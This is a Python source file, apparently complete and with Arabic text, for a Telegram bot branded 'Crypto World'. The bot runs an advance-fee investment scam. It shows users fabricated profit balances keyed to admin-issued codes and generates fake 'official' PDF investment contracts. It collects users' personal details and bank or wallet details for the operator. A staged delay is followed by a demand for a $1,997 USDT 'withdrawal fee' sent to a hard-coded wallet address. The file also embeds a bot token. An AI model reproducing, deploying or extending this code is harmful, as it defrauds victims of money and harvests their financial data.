import logging
import os
import asyncio
import io
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove, Update
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
)

# التوكن المعتمد للبوت
TOKEN = "9014957370:AAHEFAt-9tIbs2qJvUPA-H4QBB2mn4f6v4M"
ADMIN_ID = 7004113433  # معرف الأدمن الخاص بك
SUPPORT_HANDLE = "@AbuAbdulAlziz"

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

user_states = {}
user_custom_data = {}
all_users_set = set()

# قاعدة بيانات الأكواد والمبالغ المخصصة للمستخدمين (دائمة وغير قابلة للحرق)
custom_profits = {
    "354101": {"amount": "45,500", "assigned_user_id": None},
    "00554": {"amount": "45,500", "assigned_user_id": None},
    "3585556": {"amount": "45,500", "assigned_user_id": None},
    "189415": {"amount": "1500", "assigned_user_id": None}
}

def estimate_account_age(user_id: int) -> str:
    if user_id < 10000000:
        return "حساب قديم جداً (من أوائل الحسابات في المنصة)"
    elif user_id < 100000000:
        return "حساب قديم (بين 2014 - 2016 تقريباً)"
    elif user_id < 500000000:
        return "حساب متوسط القدَم (بين 2016 - 2019 تقريباً)"
    elif user_id < 1000000000:
        return "حساب نشط منذ عدة سنوات (بين 2019 - 2022 تقريباً)"
    else:
        return "حساب حديث نسبياً (وتم إنشاؤه في السنوات الأخيرة)"

# وظيفة لتوليد ملف الـ PDF لعقد الاشتراك
def generate_contract_pdf(user_id: str, code: str, amount: str) -> io.BytesIO:
    buffer = io.BytesIO()
    c = canvas.Canvas(buffer, pagesize=letter)
    width, height = letter

    # عنوان العقد
    c.setFont("Helvetica-Bold", 18)
    c.drawString(200, height - 50, "Crypto World | عالم الكريبتو")
    
    c.setFont("Helvetica-Bold", 14)
    c.drawString(220, height - 80, "عقد اشتراك استثماري رسمي")

    # تفاصيل العقد
    c.setFont("Helvetica", 12)
    y = height - 140
    lines = [
        f"معرف المستثمر (ID): {user_id}",
        f"رقم التحقق المعتمد: {code}",
        f"إجمالي الأرباح والمحافظة: {amount} دولار",
        f"حالة الحساب: موثق وفعّال في النظام",
        "-" * 50,
        "شروط وأحكام العقد:",
        "1. يلتزم الطرفين بضمان سرية وأمان العمليات الاستثمارية.",
        "2. يحق للمستثمر سحب أرباحه وفق الشروط والأحكام المعتمدة بالمنصة.",
        "3. هذا المستند رسمي وموثق رقمياً عبر بوت عالم الكريبتو.",
    ]

    for line in lines:
        c.drawString(50, y, line)
        y -= 25

    c.setFont("Helvetica-Oblique", 10)
    c.drawString(50, 100, "تم اعتماد هذا العقد إلكترونياً لصالح منصة عالم الكريبتو | Crypto World")
    
    c.showPage()
    c.save()
    buffer.seek(0)
    return buffer

# أمر الأدمن لإرسال العقد للمستخدم: /contract <user_id> <code_number>
async def send_contract(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
            "اكتب الأمر بهذا الشكل:\n"
            "`/contract <معرف_المستخدم> <كود_التحقق>`\n\n"
            "مثال:\n`/contract 6413819899 3585556`",
            parse_mode="Markdown"
        )
        return

    target_user_id = args[0].strip()
    code = args[1].strip()

    # جلب المبلغ المرتبط بالكود أو افتراضي
    amount = "45,500"
    if code in custom_profits:
        amount = custom_profits[code]["amount"]

    # إنشاء ملف الـ PDF
    pdf_buffer = generate_contract_pdf(target_user_id, code, amount)
    pdf_buffer.name = f"Crypto_Contract_{target_user_id}.pdf"

    contract_text = (
        "📜 **عقد اشتراك استثماري رسمي - عالم الكريبتو | Crypto World** 🌐\n\n"
        f"• معرف المستثمر: `{target_user_id}`\n"
        f"• رقم التحقق: `{code}`\n"
        f"• إجمالي المحفظة/الأرباح: `{amount} دولار`\n\n"
        "مرفق أدناه نسخة العقد الرسمية بصيغة (PDF).\n"
        "شكراً لثقتكم بانضمامك إلى منصتنا."
    )

    try:
        # إرسال العقد للمستخدم المستهدف
        await context.bot.send_document(
            chat_id=int(target_user_id),
            document=pdf_buffer,
            caption=contract_text,
            parse_mode="Markdown"
        )
        await update.message.reply_text(f"✅ تم إرسال عقد الاشتراك (PDF) بنجاح للمستخدم `{target_user_id}`!", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ فشل إرسال العقد للمستخدم. التأكد من أن المستخدم قد بدأ محادثة مع البوت مسبقاً.\nالخطأ: {e}")

# أمر الإذاعة للجميع
async def broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    text_to_send = " ".join(context.args)
    if not text_to_send:
        await update.message.reply_text("⚠️ اكتب الرسالة بعد الأمر `/broadcast`", parse_mode="Markdown")
        return

    success_count = 0
    status_msg = await update.message.reply_text("🚀 جاري إرسال الرسالة لجميع المستخدمين...")
    for uid in all_users_set:
        try:
            await context.bot.send_message(chat_id=uid, text=text_to_send, parse_mode="Markdown")
            success_count += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
    await status_msg.edit_text(f"📊 تم الإرسال بنجاح إلى: `{success_count}` مستخدم", parse_mode="Markdown")

# أمر تحديد الأرباح
async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("⚠️ `/setprofit <معرف_المستخدم> <المبلغ> <رقم_التحقق>`", parse_mode="Markdown")
        return
    target_user_id = args[0].strip()
    amount = args[1].strip()
    code = args[2].strip()

    custom_profits[code] = {"amount": amount, "assigned_user_id": int(target_user_id)}
    await update.message.reply_text(f"✅ تم تخصيص الأرباح بنجاح للمستخدم `{target_user_id}` برقم تحقق `{code}`", parse_mode="Markdown")

async def admin_get_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    codes_str = ", ".join([f"{code} (مبلغ: {data['amount']})" for code, data in custom_profits.items()])
    await update.message.reply_text(f"🔑 الأكواد الدائمة الفعّالة:\n`{codes_str}`", parse_mode="Markdown")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    user_states[user_id] = "waiting_for_subscription_text"
    all_users_set.add(user_id)
    
    age_estimation = estimate_account_age(user_id)
    welcome_msg = (
        f"🌟 أهلاً بك في منصة **عالم الكريبتو | Crypto World** 🌐\n"
        f"نسعد بانضمامك إلينا لنخطو معاً نحو مستقبل استثماري متميز ومربح.\n\n"
        f"📊 معلومات حسابك:\n"
        f"• معرفك الشخصي (ID): `{user_id}`\n"
        f"• تقدير الحساب: {age_estimation}\n\n"
        f"الرجاء إرسال بياناتك صحيحة (خطوات التسجيل والإشتراك) ليتم التعرف عليك في النظام."
    )
    await update.message.reply_text(welcome_msg, parse_mode="Markdown", reply_markup=ReplyKeyboardRemove())

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    all_users_set.add(user_id)
    username = f"@{user.username}" if user.username else "بدون معرف"
    if not update.message.photo:
        return

    photo = update.message.photo[-1]
    await update.message.reply_text("📸 **تم استلام صورة الوصل (الإيصال) بنجاح!**\n\nجاري مراجعة وتأكيد عملية دفع الرسوم من قبل الإدارة.", parse_mode="Markdown")

    keyboard = [
        [
            InlineKeyboardButton("✅ تم الدفع بنجاح", callback_data=f"admin_approve_{user_id}"),
            InlineKeyboardButton("❌ تم رفض العملية", callback_data=f"admin_reject_{user_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    admin_caption = f"📥 **إيصال دفع رسوم سحب جديد!**\n\n👤 اسم المستثمر: {user.first_name}\n🆔 معرف المستخدم: `{user_id}`\n🔗 يوزر: {username}"
    try:
        await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo.file_id, caption=admin_caption, reply_markup=reply_markup, parse_mode="Markdown")
    except Exception:
        pass

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.text:
        return

    user_id = update.effective_user.id
    all_users_set.add(user_id)
    username = f"@{update.effective_user.username}" if update.effective_user.username else "بدون معرف"
    text = msg.text.strip()
    current_state = user_states.get(user_id)

    if current_state == "completed":
        await msg.reply_text("لقد أكملت الإجراءات بالفعل ولا داعي للتكرار. يمكنك التواصل مع الدعم الفني.")
        return

    if current_state == "waiting_for_subscription_text":
        if len(text) > 5:
            user_custom_data[user_id] = text
            user_states[user_id] = "waiting_for_code"
            await msg.reply_text("✅ تم استقبال بيانات التسجيل بنجاح.\n\nالرجاء إرسال **رقم تحقق الاشتراك** الخاص بك لتتمكن من رؤية رصيدك وأرباحك:")
        else:
            await msg.reply_text("❌ الرجاء إدخال بياناتك صحيحة (مثل بيانات الحساب أو خطوات التسجيل والاختيار)")
        return

    if current_state == "waiting_for_bank_account":
        user_states[user_id] = "completed"
        keyboard = [
            [
                InlineKeyboardButton("تأكيد السحب", callback_data="withdraw_confirm"),
                InlineKeyboardButton("إلغاء سحب", callback_data="withdraw_cancel")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await msg.reply_text("💳 **إدخال الحساب البنكي / محفظة الاستلام:**\n\nالرجاء اختيار أحد الخيارات أدناه لإتمام عملية السحب:", reply_markup=reply_markup, parse_mode="Markdown")
        await context.bot.send_message(chat_id=ADMIN_ID, text=f"🏦 **تم إدخال الحساب البنكي!**\n• معرف المستخدم: `{user_id}`\n• التفاصيل:\n{text}", parse_mode="Markdown")
        return

    if current_state == "waiting_for_code" or text in custom_profits:
        if text in custom_profits:
            code_info = custom_profits[text]
            assigned_id = code_info["assigned_user_id"]
            if assigned_id is not None and assigned_id != user_id:
                await msg.reply_text("❌ عذراً، رقم التحقق هذا غير مخصص لحسابك.")
                return

            profit_amount = code_info["amount"]
            user_states[user_id] = "viewing_balance"

            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔑 تم استخدام رقم التحقق: `{text}` بواسطة المستثمر `{user_id}`", parse_mode="Markdown")

            keyboard = [[InlineKeyboardButton("💳 ادخل حسابك البنكي", callback_data="enter_bank_account")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            user_specific_data = user_custom_data.get(user_id, "بيانات التسجيل مسجلة بنجاح")

            await msg.reply_text(
                text=f"✅ **تم التحقق من رقم التحقق بنجاح!**\n\n💰 **رصيدك وأرباحك المتاحة:** `{profit_amount} دولار`\n\nإليك بياناتك المسجلة:\n\n{user_specific_data}",
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
        else:
            await msg.reply_text("❌ رقم التحقق غير صحيح.")
        return

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    chat_id = query.message.chat_id
    user = query.from_user
    user_id = user.id
    all_users_set.add(user_id)
    username = f"@{user.username}" if user.username else "بدون معرف"

    if data.startswith("admin_approve_") or data.startswith("admin_reject_"):
        if user_id != ADMIN_ID:
            return
        parts = data.split("_")
        action = parts[1]
        target_user_id = int(parts[2])

        if action == "approve":
            await context.bot.send_message(chat_id=target_user_id, text="✅ **تهانينا! تم تأكيد الدفع وعملية سحب أرباحك بنجاح في (عالم الكريبتو).**", parse_mode="Markdown")
            await query.edit_message_caption(caption=query.message.caption + "\n\n✅ **[تمت الموافقة وتأكيد السحب]**", parse_mode="Markdown")
        elif action == "reject":
            await context.bot.send_message(chat_id=target_user_id, text="❌ **عذراً، لم تقم بدفع المبلغ أو تم رفض العملية.**", parse_mode="Markdown")
            await query.edit_message_caption(caption=query.message.caption + "\n\n❌ **[تم رفض العملية]**", parse_mode="Markdown")
        return

    if data == "enter_bank_account":
        user_states[user_id] = "waiting_for_bank_account"
        await query.edit_message_text("💳 **إدخال الحساب البنكي / محفظة الاستلام:**\n\nأرسل تفاصيل محفظتك أو حسابك في رسالة:", parse_mode="Markdown")

    elif data == "withdraw_cancel":
        user_states[user_id] = "completed"
        await query.edit_message_text("تم الإلغاء بنجاح")

    elif data == "withdraw_confirm":
        user_states[user_id] = "completed"
        await query.edit_message_text("⏳ **جاري التحقق من عملية السحب وتأكيد البيانات مع النظام المالي (مهلة 60 ثانية)...**", parse_mode="Markdown")
        await asyncio.sleep(60)
        keyboard = [[InlineKeyboardButton("💳 دفع", callback_data="pay_fees")]]
        await query.edit_message_text(
            "عذرًا لقد تم للتو تحديث نظام البيانات. يرجى العلم بأن هناك رسوم سحب مستحقة على حسابكم، ولإتمام عملية دفع الرسوم يرجى الضغط على زر \"دفع\" أدناه، ثم رفع صورة الوصل ليتم تأكيد السحب بنجاح",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )

    elif data == "pay_fees":
        pay_details = (
            "💳 **دفع رسوم السحب:**\n\n"
            "العملة: **USDT**\n"
            "المبلغ: **1997 دولار**\n"
            "الشبكة: **BNB Smart Chain (BEP20)**\n\n"
            "العنوان:\n"
            "`0x4aaf2231199d24842e606f99b4f69bb5cddb171e`\n\n"
            "يرجى تحويل مبلغ الرسوم المطلوبة، ثم إرسال صورة الوصل (Screenshot) هنا في المحادثة ليتم تأكيد سحبك بنجاح."
        )
        await query.edit_message_text(pay_details, parse_mode="Markdown")

def main():
    if not TOKEN:
        raise ValueError("❌ خطأ التوكن!")
        
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("codes", admin_get_codes))
    app.add_handler(CommandHandler("setprofit", set_profit))
    app.add_handler(CommandHandler("broadcast", broadcast_message))
    app.add_handler(CommandHandler("contract", send_contract))  # أمر إرسال عقد الاشتراك PDF
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل بكفاءة مع إصدار عقود الـ PDF...")
    app.run_polling()

if __name__ == "__main__":
    main()
